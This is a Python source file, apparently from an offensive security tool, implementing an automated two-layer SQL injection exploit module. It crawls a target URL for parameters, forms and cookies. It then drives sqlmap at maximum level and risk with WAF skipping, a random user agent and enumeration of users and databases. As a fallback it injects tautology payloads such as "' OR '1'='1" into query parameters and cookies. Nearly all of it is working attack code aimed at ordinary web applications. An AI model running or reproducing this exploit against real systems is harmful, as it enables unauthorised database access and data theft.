# from typing import Dict, Any
# from exploits.base_exploit import BaseExploit
# from core.target import Vulnerability
# from utils.http_client import HTTPClient


# class SQLiExploit(BaseExploit):
#     """SQL Injection exploitation module"""
    
#     def __init__(self):
#         super().__init__("SQLi Exploit")
#         self.http_client = HTTPClient()
    
#     def execute(self, vulnerability: Vulnerability) -> Dict[str, Any]:
#         """Exploit SQL injection to extract data"""
        
#         # TODO: Implement exploitation techniques:
#         # 1. Determine database type
#         # 2. Extract database structure
#         # 3. Dump sensitive data (carefully and ethically!)
#         # 4. Document findings
        
#         result = {
#             'success': False,
#             'data': None,
#             'evidence': '',
#             'technique': 'union-based'  # or 'blind', 'error-based', etc.
#         }
        
#         try:
#             # Example: Try UNION-based extraction
#             db_version = self._extract_version(vulnerability)
#             if db_version:
#                 result['success'] = True
#                 result['data'] = {'db_version': db_version}
#                 result['evidence'] = f"Successfully extracted DB version: {db_version}"
            
#         except Exception as e:
#             result['evidence'] = f"Exploitation failed: {str(e)}"
        
#         return result
    
#     def _extract_version(self, vuln: Vulnerability) -> str:
#         """Extract database version"""
#         # Placeholder - implement actual extraction logic
#         return None
"""
SQL Injection Exploitation Module - 2-Layer Architecture
Input: URL only (automatic parameter/cookie/form detection)
Layer 1: SQLMap (Full Power - All Techniques)
Layer 2: Custom Exploitation (Fallback if SQLMap fails)

Usage:
    exploit = SQLiExploit()
    result = exploit.execute(vulnerability)
"""

import os
import re
import json
import shlex
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from typing import Dict, Any, Optional, List, Tuple

import yaml

from exploits.base_exploit import BaseExploit
from core.target import Vulnerability
from utils.http_client import HTTPClient


class TargetAnalyzer:
    """Analyze target URL to find all testable parameters"""
    
    def __init__(self):
        self.http_client = HTTPClient()
    
    def analyze(self, url: str) -> Dict[str, Any]:
        """
        Analyze URL and extract all testable points:
        - GET parameters
        - POST parameters (from forms)
        - Cookies
        """
        from urllib.parse import urlparse, parse_qs
        
        analysis = {
            'url': url,
            'get_params': [],
            'post_params': [],
            'cookies': {},
            'forms': []
        }
        
        try:
            # Extract GET parameters from URL
            parsed = urlparse(url)
            if parsed.query:
                params = parse_qs(parsed.query)
                analysis['get_params'] = list(params.keys())
            
            # Get the page
            response = self.http_client.get(url)
            
            # Extract cookies
            if response.cookies:
                analysis['cookies'] = dict(response.cookies)
            
            # Parse HTML to find forms
            forms = self._extract_forms(response.text, url)
            analysis['forms'] = forms
            
            # Extract POST parameters from forms
            for form in forms:
                analysis['post_params'].extend(form.get('inputs', []))
            
            analysis['post_params'] = list(set(analysis['post_params']))
            
        except Exception as e:
            print(f"[!] Target analysis warning: {e}")
        
        return analysis
    
    def _extract_forms(self, html: str, base_url: str) -> List[Dict[str, Any]]:
        """Extract all forms from HTML"""
        forms = []
        
        try:
            from bs4 import BeautifulSoup
            from urllib.parse import urlparse
            
            soup = BeautifulSoup(html, 'html.parser')
            
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                # Make action URL absolute
                if form_data['action']:
                    if not form_data['action'].startswith('http'):
                        parsed = urlparse(base_url)
                        form_data['action'] = f"{parsed.scheme}://{parsed.netloc}{form_data['action']}"
                else:
                    form_data['action'] = base_url
                
                # Extract input fields
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_name = input_tag.get('name')
                    if input_name:
                        form_data['inputs'].append(input_name)
                
                if form_data['inputs']:
                    forms.append(form_data)
        
        except ImportError:
            print("[!] BeautifulSoup not installed - form detection disabled")
            print("[!] Install: pip install beautifulsoup4")
        except Exception:
            pass
        
        return forms


class SQLMapWrapper:
    """Wrapper for SQLMap with aggressive configuration"""
    
    def __init__(self, config: dict = None):
        self.config = config or {}
        self.sqlmap_cmd = self._resolve_sqlmap_command()
        self.output_dir = Path(tempfile.gettempdir()) / 'graytera_sqlmap'
        self.output_dir.mkdir(exist_ok=True)
    
    def _resolve_sqlmap_command(self) -> Optional[List[str]]:
        """Find SQLMap executable/entrypoint and return the base command list"""
        # 1. Highest priority: explicit config value
        config_path = self.config.get('path')
        if config_path:
            cmd = self._normalize_candidate(config_path)
            if self._validate_sqlmap(cmd):
                return cmd
        
        # 2. Environment variable
        env_path = os.getenv('SQLMAP_PATH')
        if env_path:
            cmd = self._normalize_candidate(env_path)
            if self._validate_sqlmap(cmd):
                return cmd
        
        # 3. Common candidates
        candidates = self._default_sqlmap_candidates()
        for candidate in candidates:
            cmd = self._normalize_candidate(candidate)
            if self._validate_sqlmap(cmd):
                return cmd
        
        return None
    
    def _default_sqlmap_candidates(self) -> List[List[str]]:
        """Generate a list of likely sqlmap entrypoints"""
        python_exec = sys.executable or 'python'
        scripts_dir = Path(python_exec).parent / ('Scripts' if os.name == 'nt' else 'bin')
        
        possible_paths = [
            shutil.which('sqlmap'),
            shutil.which('sqlmap.py'),
            str(scripts_dir / 'sqlmap'),
            str(scripts_dir / 'sqlmap.py'),
            str(Path.home() / 'sqlmap' / 'sqlmap.py'),
            '/usr/bin/sqlmap',
            '/usr/local/bin/sqlmap',
        ]
        
        # Remove None entries but keep order
        possible_paths = [p for p in possible_paths if p]
        
        candidates: List[List[str]] = [
            ['sqlmap'],
            ['sqlmap.py'],
            [python_exec, '-m', 'sqlmap'],
            [python_exec.replace('pythonw', 'python'), '-m', 'sqlmap'],
            ['python', '-m', 'sqlmap'],
            ['python3', '-m', 'sqlmap'],
        ]
        
        for path in possible_paths:
            candidates.append([path])
            candidates.append([python_exec, path])
        
        return candidates
    
    def _normalize_candidate(self, candidate: Any) -> Optional[List[str]]:
        """Normalize different candidate types into a command list"""
        if not candidate:
            return None
        
        if isinstance(candidate, list):
            return candidate
        
        if isinstance(candidate, tuple):
            return list(candidate)
        
        candidate = str(candidate).strip()
        if not candidate:
            return None
        
        # Respect quoted strings and Windows paths with spaces
        tokens = shlex.split(candidate, posix=os.name != 'nt')
        return tokens if tokens else None
    
    def _validate_sqlmap(self, base_cmd: Optional[List[str]]) -> bool:
        """Check whether the provided command successfully runs sqlmap"""
        if not base_cmd:
            return False
        
        try:
            cmd = base_cmd + ['--version']
            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=5,
                text=True,
                input='\n'
            )
            combined = (result.stdout + result.stderr).lower()
            if result.returncode != 0:
                return False
            
            # Some Windows launchers (sqlmap.exe) emit no version string; trust the command name in that case
            if combined:
                if 'sqlmap' in combined:
                    return True
                # Some builds print only version text; allow fallback to executable name
                executable = base_cmd[0].lower()
                return 'sqlmap' in executable
            
            executable = base_cmd[0].lower()
            return 'sqlmap' in executable
        except (OSError, subprocess.SubprocessError):
            return False
    
    def run_full_scan(self, url: str, analysis: Dict[str, Any] = None) -> Dict[str, Any]:
        """Run SQLMap with maximum aggressiveness"""
        if not self.sqlmap_cmd:
            # Retry resolution in case environment changed after initialization
            self.sqlmap_cmd = self._resolve_sqlmap_command()
        
        if not self.sqlmap_cmd:
            return {
                'success': False,
                'error': 'SQLMap not found. Install: pip install sqlmap OR git clone https://github.com/sqlmapproject/sqlmap.git'
            }
        
        session_name = f"graytera_{abs(hash(url))}"
        output_path = self.output_dir / session_name
        
        # Get config values
        level = self.config.get('level', 5)
        risk = self.config.get('risk', 3)
        threads = self.config.get('threads', 10)
        timeout = self.config.get('timeout', 600)
        crawl = self.config.get('crawl_depth', 3)
        
        # Build command
        cmd = self.sqlmap_cmd + [
            '-u', url,
            '--batch',
            '--random-agent',
            
            # Aggressiveness
            f'--level={level}',
            f'--risk={risk}',
            
            # All techniques
            '--technique=BEUSTQ',
            
            # Auto-detection
            f'--crawl={crawl}',
            '--forms',
            
            # Speed
            f'--threads={threads}',
            '--time-sec=2',
            
            # Smart options
            '--smart',
            '--skip-waf',
            
            # Output
            '--output-dir', str(output_path),
            '--flush-session',
            
            # Enumeration
            '--banner',
            '--current-user',
            '--current-db',
            '--dbs',
        ]
        
        # Add parameters if found
        if analysis and analysis.get('get_params'):
            cmd.extend(['-p', ','.join(analysis['get_params'])])
        
        # Add cookies if found
        if analysis and analysis.get('cookies'):
            cookie_str = '; '.join([f"{k}={v}" for k, v in analysis['cookies'].items()])
            cmd.extend(['--cookie', cookie_str])
        
        try:
            print(f"[*] Running SQLMap (Level={level}, Risk={risk})...")
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                cwd=str(self.output_dir),
                input='\n'
            )
            
            output_data = self._parse_sqlmap_output(output_path, result.stdout, result.stderr)
            
            if output_data['vulnerable']:
                output_data['success'] = True
                return output_data
            else:
                return {
                    'success': False,
                    'vulnerable': False,
                    'error': 'No SQL injection found'
                }
        
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'error': f'SQLMap timeout ({timeout}s)'
            }
        except Exception as e:
            return {
                'success': False,
                'error': f'SQLMap error: {str(e)}'
            }
    
    def _parse_sqlmap_output(self, output_path: Path, stdout: str, stderr: str) -> Dict[str, Any]:
        """Parse SQLMap results"""
        data = {
            'vulnerable': False,
            'injection_points': [],
            'injection_types': [],
            'payloads': [],
            'dbms': None,
            'current_user': None,
            'current_db': None,
            'databases': [],
            'is_dba': False,
        }
        
        stdout_lower = stdout.lower()
        
        # Check vulnerability through positive statements only
        vulnerability_patterns = [
            r"parameter\s+[\"']?[\w\[\]]+[\"']?\s+is\s+vulnerable",
            r"sqlmap identified the following injection point",
            r"the\s+(?:get|post)\s+parameter\s+[\"']?[\w\[\]]+[\"']?\s+appears\s+to\s+be\s+[^\n]+?injectable"
        ]
        for pattern in vulnerability_patterns:
            if re.search(pattern, stdout_lower, re.IGNORECASE):
                data['vulnerable'] = True
                break
        
        # Extract injection points
        param_matches = re.findall(r'parameter[:\s]+[\'"]?(\w+)[\'"]?\s+is vulnerable', stdout, re.IGNORECASE)
        data['injection_points'] = list(set(param_matches))
        
        # Extract DBMS
        dbms_match = re.search(r'back-end DBMS:\s*([^\n]+)', stdout, re.IGNORECASE)
        if dbms_match:
            data['dbms'] = dbms_match.group(1).strip()
        
        # Extract injection types
        for technique in ['boolean-based blind', 'error-based', 'union query', 'time-based blind', 'stacked queries']:
            if technique in stdout_lower:
                data['injection_types'].append(technique.replace(' ', '-'))
        
        # Extract payloads
        payload_matches = re.findall(r'payload:\s*([^\n]+)', stdout, re.IGNORECASE)
        if payload_matches:
            data['payloads'] = [payload.strip() for payload in payload_matches]
        
        # Extract user
        user_match = re.search(r'current user:\s*[\'"]*([^\n\'"]+)', stdout, re.IGNORECASE)
        if user_match:
            data['current_user'] = user_match.group(1).strip()
        
        # Extract current DB
        db_match = re.search(r'current database:\s*[\'"]*([^\n\'"]+)', stdout, re.IGNORECASE)
        if db_match:
            data['current_db'] = db_match.group(1).strip()
        
        # Check DBA
        if 'current user is dba' in stdout_lower:
            data['is_dba'] = True
        
        # Extract databases
        db_list_match = re.search(r'available databases.*?:\s*\[([^\]]+)\]', stdout, re.IGNORECASE | re.DOTALL)
        if db_list_match:
            dbs = re.findall(r'[\'"]([^\'"]+)[\'"]', db_list_match.group(1))
            data['databases'] = dbs[:20]
        
        return data


class CustomSQLiExploit:
    """Custom exploitation (Layer 2 fallback)"""
    
    def __init__(self):
        self.http_client = HTTPClient(timeout=10)
        self.payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' --",
            "' OR '1'='1'%00",
            "' OR 'x'='x",
            "' oR 1=1--",
            "' OR /**/1=1--",
        ]
        self.detail_keyword = 'View details'
        self.strategies = self._load_strategies()
    
    def exploit(self, url: str, analysis: Dict[str, Any]) -> Dict[str, Any]:
        """Try custom payloads"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        result = {
            'success': False,
            'tested_params': 0,
            'working_payloads': [],
            'vulnerable_params': []
        }
        
        baseline = self._fetch_baseline(url)

        # Execute advanced strategies
        strategy_hits, strategy_tests = self._run_strategies(url, analysis, baseline)
        result['tested_params'] += strategy_tests
        if strategy_hits:
            result['success'] = True
            result['working_payloads'].extend(strategy_hits)
            result['vulnerable_params'].extend([
                item['param'] for item in strategy_hits if item.get('param')
            ])
            return result
        
        # Test GET parameters
        if analysis.get('get_params'):
            for param in analysis['get_params']:
                result['tested_params'] += 1
                
                for payload in self.payloads:
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param] = [payload]
                    new_query = urlencode(params, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
                                          parsed.params, new_query, parsed.fragment))
                    
                    try:
                        response = self.http_client.get(test_url)
                        
                        is_vulnerable, reason = self._check_vulnerability(response, baseline)
                        if is_vulnerable:
                            result['success'] = True
                            result['working_payloads'].append({
                                'param': param,
                                'payload': payload,
                                'type': 'GET',
                                'reason': reason,
                                'strategy': 'baseline_delta'
                            })
                            result['vulnerable_params'].append(param)
                            break
                    except Exception:
                        continue
        
        return result
    
    def _fetch_baseline(self, url: str) -> Optional[Dict[str, Any]]:
        """Fetch baseline response statistics for comparison"""
        try:
            response = self.http_client.get(url)
            return {
                'status': response.status_code,
                'length': len(response.text),
                'detail_count': response.text.count(self.detail_keyword),
                'text': response.text,
                'text_sample': response.text[:200]
            }
        except Exception:
            return None
    
    def _check_vulnerability(self, response, baseline: Optional[Dict[str, Any]]) -> (bool, str):
        """Check if response indicates SQLi via errors or content deltas"""
        response_text = response.text
        text_lower = response_text.lower()
        indicators = ['sql syntax', 'mysql', 'syntax error', 'database error']
        for indicator in indicators:
            if indicator in text_lower:
                return True, f"error keyword '{indicator}' found"
        
        if baseline:
            # Count specific keyword differences if present
            current_detail = response_text.count(self.detail_keyword)
            if current_detail > baseline['detail_count'] and current_detail - baseline['detail_count'] >= 5:
                return True, f"detail count increased from {baseline['detail_count']} to {current_detail}"
            
            length_diff = len(response_text) - baseline['length']
            if length_diff > max(200, baseline['length'] * 0.3):
                return True, f"response length increased by {length_diff} chars"
            
            if response.status_code != baseline['status']:
                return True, f"status changed {baseline['status']} -> {response.status_code}"
        
        return False, ''

    def _load_strategies(self) -> List[Dict[str, Any]]:
        """Load advanced strategy definitions from YAML"""
        path = Path('payloads') / 'sqli_strategies.yaml'
        if path.exists():
            try:
                with open(path, 'r', encoding='utf-8') as handle:
                    data = yaml.safe_load(handle) or {}
                    return data.get('strategies', []) or self._default_strategies()
            except Exception as exc:
                print(f"[!] Failed to load SQLi strategies: {exc}")
        return self._default_strategies()

    def _default_strategies(self) -> List[Dict[str, Any]]:
        """Fallback strategy set if YAML cannot be loaded"""
        return [
            {
                'name': 'basic_hidden_data',
                'description': 'Detect hidden data by counting product cards.',
                'target': 'query',
                'detection': {
                    'type': 'length_delta',
                    'min_delta': 500
                },
                'payloads': ["' OR '1'='1"]
            }
        ]

    def _run_strategies(self, url: str, analysis: Dict[str, Any], baseline: Optional[Dict[str, Any]]) -> Tuple[List[Dict[str, Any]], int]:
        """Execute advanced strategies defined in YAML"""
        hits: List[Dict[str, Any]] = []
        tested = 0
        
        for strategy in self.strategies:
            target = strategy.get('target', 'query')
            if target == 'query':
                strategy_hits, strategy_tests = self._run_query_strategy(strategy, url, analysis, baseline)
            elif target == 'cookie':
                strategy_hits, strategy_tests = self._run_cookie_strategy(strategy, url, analysis, baseline)
            else:
                continue
            
            tested += strategy_tests
            hits.extend(strategy_hits)
        
        return hits, tested

    def _run_query_strategy(self, strategy: Dict[str, Any], url: str, analysis: Dict[str, Any], baseline: Optional[Dict[str, Any]]) -> Tuple[List[Dict[str, Any]], int]:
        """Run a strategy targeting query parameters"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        hits: List[Dict[str, Any]] = []
        tested = 0
        params = analysis.get('get_params', [])
        hint = strategy.get('param')
        if hint:
            params = [p for p in params if p.lower() == hint.lower()]
        
        if not params:
            return hits, tested
        
        for param in params:
            for payload in strategy.get('payloads', []):
                tested += 1
                try:
                    parsed = urlparse(url)
                    params_map = parse_qs(parsed.query)
                    params_map[param] = [payload]
                    new_query = urlencode(params_map, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                           parsed.params, new_query, parsed.fragment))
                    response = self.http_client.get(test_url, raise_for_status=False)
                    success, reason = self._evaluate_detection(strategy.get('detection', {}), response, baseline)
                    if success:
                        hits.append({
                            'param': param,
                            'payload': payload,
                            'type': 'GET',
                            'strategy': strategy.get('name'),
                            'reason': reason or strategy.get('description', 'strategy match')
                        })
                        break
                except Exception:
                    continue
        
        return hits, tested

    def _run_cookie_strategy(self, strategy: Dict[str, Any], url: str, analysis: Dict[str, Any], baseline: Optional[Dict[str, Any]]) -> Tuple[List[Dict[str, Any]], int]:
        """Run a strategy targeting cookies"""
        hits: List[Dict[str, Any]] = []
        tested = 0
        cookie_name = strategy.get('cookie_name')
        cookies = analysis.get('cookies') or {}
        if not cookie_name or cookie_name not in cookies:
            return hits, tested
        
        base_value = cookies.get(cookie_name, '')
        
        for payload in strategy.get('payloads', []):
            tested += 1
            try:
                cookie_payload = f"{base_value}{payload}"
                cookie_jar = cookies.copy()
                cookie_jar[cookie_name] = cookie_payload
                response = self.http_client.get(url, cookies=cookie_jar, raise_for_status=False)
                success, reason = self._evaluate_detection(strategy.get('detection', {}), response, baseline)
                if success:
                    hits.append({
                        'param': cookie_name,
                        'payload': payload,
                        'type': 'COOKIE',
                        'strategy': strategy.get('name'),
                        'reason': reason or strategy.get('description', 'strategy match')
                    })
                    break
            except Exception:
                continue
        
        return hits, tested

    def _evaluate_detection(self, detection: Dict[str, Any], response, baseline: Optional[Dict[str, Any]]) -> Tuple[bool, str]:
        """Evaluate whether injected response meets strategy success criteria"""
        dtype = detection.get('type')
        baseline_text = (baseline or {}).get('text', '') if baseline else ''
        
        if dtype == 'keyword_delta':
            keyword = detection.get('keyword', '')
            min_delta = detection.get('min_delta', 1)
            base_count = baseline_text.count(keyword) if baseline_text else 0
            current = response.text.count(keyword)
            if current - base_count >= min_delta:
                return True, f"keyword '{keyword}' increased from {base_count} to {current}"
        elif dtype == 'length_delta':
            min_delta = detection.get('min_delta', 200)
            base_length = (baseline or {}).get('length', 0)
            diff = len(response.text) - base_length
            if diff >= min_delta:
                return True, f"response length increased by {diff} chars"
        elif dtype == 'keyword_presence':
            keyword = detection.get('keyword', '')
            if keyword and keyword in response.text:
                return True, f"keyword '{keyword}' detected in response"
        elif dtype == 'status_code':
            status = detection.get('status')
            allowed = detection.get('statuses')
            allowed_codes = allowed or ([status] if status else [])
            if allowed_codes and response.status_code in allowed_codes:
                return True, f"status code matched expected {response.status_code}"
        elif dtype == 'time_delay':
            threshold = detection.get('threshold', 5)
            elapsed = response.elapsed.total_seconds()
            if elapsed >= threshold:
                return True, f"response delayed {elapsed:.1f}s"
        
        return False, ''


class SQLiExploit(BaseExploit):
    """
    Main SQLi Exploit - 2-Layer Architecture
    Input: URL only (automatic detection)
    """
    
    def __init__(self, config: dict = None):
        super().__init__("SQLi Exploit (2-Layer)")
        self.config = config or {}
        self.analyzer = TargetAnalyzer()
        self.sqlmap = SQLMapWrapper(self.config.get('sqlmap', {}))
        self.custom = CustomSQLiExploit()
    
    def execute(self, vulnerability: Vulnerability) -> Dict[str, Any]:
        """Execute 2-Layer exploitation with URL only"""
        result = {
            'success': False,
            'data': {},
            'evidence': '',
            'layers_used': [],
            'time_elapsed': 0
        }
        
        url = vulnerability.url
        start_time = time.time()
        
        print(f"\n{'='*70}")
        print(f"[*] 2-Layer SQL Injection Exploitation")
        print(f"[*] Target: {url}")
        print(f"{'='*70}\n")
        
        # STEP 0: Analyze Target
        print(f"[STEP 0] Analyzing target...")
        analysis = self.analyzer.analyze(url)
        
        print(f"[+] Analysis:")
        print(f"    GET params: {len(analysis['get_params'])}")
        print(f"    Forms: {len(analysis['forms'])}")
        print(f"    Cookies: {len(analysis['cookies'])}")
        
        if analysis['get_params']:
            print(f"    Parameters: {', '.join(analysis['get_params'])}")
        
        result['data']['analysis'] = analysis
        
        # LAYER 1: SQLMap
        print(f"\n[LAYER 1] SQLMap (Full Power)...")
        
        sqlmap_start = time.time()
        sqlmap_result = self.sqlmap.run_full_scan(url, analysis)
        sqlmap_time = time.time() - sqlmap_start
        
        print(f"[LAYER 1] Completed in {sqlmap_time:.1f}s")
        
        if sqlmap_result.get('success'):
            print(f"[✓] SUCCESS - SQLMap found SQLi!\n")
            
            result['success'] = True
            result['layers_used'].append('sqlmap')
            result['data']['sqlmap'] = sqlmap_result
            
            result['evidence'] = f"=== SQLMap Detection ===\n"
            result['evidence'] += f"Time: {sqlmap_time:.1f}s\n\n"
            
            if sqlmap_result.get('injection_points'):
                result['evidence'] += f"Vulnerable Parameters:\n"
                for param in sqlmap_result['injection_points']:
                    result['evidence'] += f"  • {param}\n"
            
            if sqlmap_result.get('injection_types'):
                result['evidence'] += f"\nInjection Types:\n"
                for itype in sqlmap_result['injection_types']:
                    result['evidence'] += f"  • {itype}\n"
            
            if sqlmap_result.get('dbms'):
                result['evidence'] += f"\nDatabase: {sqlmap_result['dbms']}\n"
            
            if sqlmap_result.get('payloads'):
                result['evidence'] += f"\nPayloads:\n"
                for payload in sqlmap_result['payloads'][:5]:
                    result['evidence'] += f"  • {payload}\n"
            
            if sqlmap_result.get('current_user'):
                result['evidence'] += f"User: {sqlmap_result['current_user']}\n"
            
            if sqlmap_result.get('current_db'):
                result['evidence'] += f"Current DB: {sqlmap_result['current_db']}\n"
            
            if sqlmap_result.get('databases'):
                result['evidence'] += f"\nDatabases ({len(sqlmap_result['databases'])}):\n"
                for db in sqlmap_result['databases'][:10]:
                    result['evidence'] += f"  • {db}\n"
            
            result['time_elapsed'] = time.time() - start_time
            return result
        
        # LAYER 2: Custom
        print(f"[LAYER 1] No vulnerabilities\n")
        print(f"[LAYER 2] Custom exploitation...")
        
        custom_start = time.time()
        custom_result = self.custom.exploit(url, analysis)
        custom_time = time.time() - custom_start
        
        print(f"[LAYER 2] Completed in {custom_time:.1f}s")
        
        if custom_result.get('success'):
            print(f"[✓] SUCCESS - Custom payloads worked!\n")
            
            result['success'] = True
            result['layers_used'].append('custom')
            result['data']['custom'] = custom_result
            
            result['evidence'] = f"=== Custom Exploitation ===\n"
            result['evidence'] += f"Time: {custom_time:.1f}s\n\n"
            result['evidence'] += f"Vulnerable Parameters: {', '.join(set(custom_result['vulnerable_params']))}\n\n"
            result['evidence'] += f"Working Payloads:\n"
            for item in custom_result['working_payloads'][:5]:
                reason = item.get('reason', 'detected change')
                strategy = item.get('strategy')
                strategy_label = f"[{strategy}] " if strategy else ""
                result['evidence'] += f"  • {strategy_label}{item['param']}: {item['payload']} ({reason})\n"
            
            result['time_elapsed'] = time.time() - start_time
            return result
        
        # BOTH FAILED
        print(f"[✗] No SQLi found\n")
        
        result['evidence'] = f"=== Exploitation Failed ===\n"
        result['evidence'] += f"Total: {time.time() - start_time:.1f}s\n\n"
        result['evidence'] += f"SQLMap: {sqlmap_result.get('error', 'No vulnerability')}\n"
        result['evidence'] += f"Custom: Tested {custom_result.get('tested_params', 0)} params\n"
        
        result['time_elapsed'] = time.time() - start_time
        return result